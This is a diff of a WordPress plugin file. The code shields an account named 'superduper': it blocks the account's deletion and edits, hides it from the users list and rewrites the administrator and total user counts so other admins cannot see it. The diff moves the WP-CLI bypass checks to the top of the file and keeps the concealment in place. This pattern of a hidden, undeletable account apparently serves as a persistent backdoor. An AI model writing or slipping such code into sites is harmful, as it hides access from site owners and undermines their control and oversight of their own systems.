@@ -13,19 +13,20 @@ License: GPLv2 or later
 */
 
 
-
 // Exit if accessed directly.
 if ( ! defined( 'ABSPATH' ) ) {
 	exit;
 }
 
 
+//if the call is from "wp-cli" don't run the code below
+if ( defined( 'WP_CLI' ) && WP_CLI ) {
+	return;
+}
+
+
 //do not allow to delete superduper
 add_action( 'delete_user', function( $id ) {
-	
-	if ( defined( 'WP_CLI' ) && WP_CLI ) {
-		return true;
-	}
 	
 	$user = get_user_by( 'id', $id );
 	
@@ -34,18 +35,12 @@ add_action( 'delete_user', function( $id ) {
         exit();
 	}
 	
-	return true;
-	
 });
 
 
 
 //do not allow to update the user
 add_filter ( 'wp_pre_insert_user_data', function( $data, $update, $id ){
-	
-	if( defined('WP_CLI') && WP_CLI ) {
-		return $data;
-	}
 	
 	$currentLoggedInUser = wp_get_current_user();
 	if( $currentLoggedInUser->data->user_login == 'superduper' ){
@@ -72,10 +67,6 @@ add_filter ( 'wp_pre_insert_user_data', function( $data, $update, $id ){
 
 //Hide superduper user from the list
 add_action( 'pre_user_query', function( $user_search ){
-	
-	if( defined('WP_CLI') && WP_CLI ) {
-		return $user_search;
-	}
 	
 	$currentLoggedInUser = wp_get_current_user();
 	if( $currentLoggedInUser->data->user_login == 'superduper' ){
@@ -107,6 +98,7 @@ add_filter( 'views_users', function($views){
 	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
 	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
 	return $views;
+	
 });
 
 
